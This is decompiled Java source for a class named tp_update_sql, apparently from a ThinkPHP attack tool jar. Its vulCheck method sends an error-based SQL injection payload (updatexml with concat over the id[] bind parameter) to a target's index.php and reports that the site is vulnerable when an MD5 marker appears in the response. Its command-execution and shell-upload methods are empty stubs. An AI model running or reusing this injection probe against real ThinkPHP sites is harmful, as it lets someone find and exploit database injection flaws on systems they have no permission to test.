/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.BaseExp;
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ public class tp_update_sql
/*    */   implements BaseExp {
/* 10 */   private String results = null;
/* 11 */   private HashMap<String, String> property = new HashMap<>();
/*    */ 
/*    */   
/*    */   public String vulCheck(String url) {
/* 15 */     url = url + "/index.php?money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20md5(520)),0x7e),1))";
/* 16 */     Response response = HttpTool.get(url, this.property);
/* 17 */     if (response.getText().contains("cf67355a3333e6e143439161adc2d82")) {
/* 18 */       this.results = "[+] 目标存在" + getClass().getSimpleName() + "漏洞";
/* 19 */       return this.results;
/*    */     } 
/* 21 */     if (response.getError() != null) {
/* 22 */       this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/* 23 */       return this.results;
/*    */     } 
/* 25 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/* 26 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String cmdExec(String url, String cmd) {
/* 31 */     return null;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getShell(String url, String fileName, String content) {
/* 36 */     return null;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp_update_sql.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */